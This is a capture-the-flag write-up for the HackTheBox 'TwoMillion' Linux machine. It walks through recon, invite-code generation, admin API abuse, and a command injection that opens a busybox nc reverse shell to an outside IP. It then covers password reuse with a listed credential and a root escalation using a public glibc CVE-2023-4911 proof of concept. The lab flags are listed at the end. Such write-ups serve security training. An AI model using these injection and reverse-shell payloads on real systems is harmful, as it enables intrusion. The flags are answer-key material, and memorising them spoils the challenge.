```json
Alias: TwoMillion
Date: 21-02_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.221
```

# TwoMillion
# Summary

TwoMillion has a few steps to get to user, but they are still easy. Privesc is simple and can be done using multiple ways.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 14:24 PKT
Nmap scan report for 10.10.11.221
Host is up (0.79s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.94 seconds
```
## Discovered Subdomains
```
http://2million.htb/
```

---
# Enumeration

We have an old version of the HTB running at port 80, To register to the site, we need an invite code. Visiting `http://2million.htb/invite`, and viewing the source code we can it imports the file: `http://2million.htb/js/htb-frontend.min.js`. Which is some obfuscated JavaScript. Asking chatGPT to make sense of it, we get two functions: `verifyInviteCode` and `makeInviteCode`.

The `makeInviteCode` function is interesting, it sends a POST request to `/api/v1/invite/generate`. Doing that using cURL:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

we get a base64 encoded invite code, decode it and use it to register at `http://2million.htb/register`. This URL can be found as it is where the invite page leads to upon successful verification in the source code. The Invite Code parameter in the register page is grayed out, just modify the HTML or create a cookie in your local storage named `inviteCode` and put the decoded invite code as the parameter.

---

# Exploitation

Next, upon visiting `http://2million.htb/api/v1` we see some interesting endpoints under `admin`. We can leverage these to first, make ourselves admin using `/api/v1/admin/settings/update`, use burp to send a post request here and modify it as required. The server returns verbose error messages, which easily tell us what needs to be added.

Then, using `/api/v1/admin/settings/update`, we have a command injection vulnerability. In the username parameter if we enter `username;curl http://yourip/hi` and set up a listener, you should get a request to your server. I got a reverse shell using the payload: `username;busybox nc 10.10.16.18 4444 -e /bin/bash`.

---

# Lateral Movement

The `.env` file contains the password for the database, and we have a case of password re-use. We can use these credentials to log in as admin with SSH.

| Username | Password          |
| -------- | ----------------- |
| admin    | SuperDuperPass123 |

---

# Privilege Escalation

## Local Enumeration

`/var/mail` contains an email to admin, requesting an OS Update, as the current one is vulnerable to `dirtypipe`, arbitrary write vulnerability. We also have a glib buffer overflow so there are two ways to privesc.

## Privilege Escalation Vector

We can use this: https://github.com/NishanthAnand21/CVE-2023-4911-PoC to exploit the buffer overflow and get root shell. Transfer the `exploit.c` and `genlib.py` file to the box. Get root:

```bash
gcc exploit.c
python genlib.py
./a.out
```

---

# Flags
- 3ea9740eac74df4c51c8d6f7c4cf6269
- 3d46cfd5b6c7841703aaeecf54c15c05

#CTF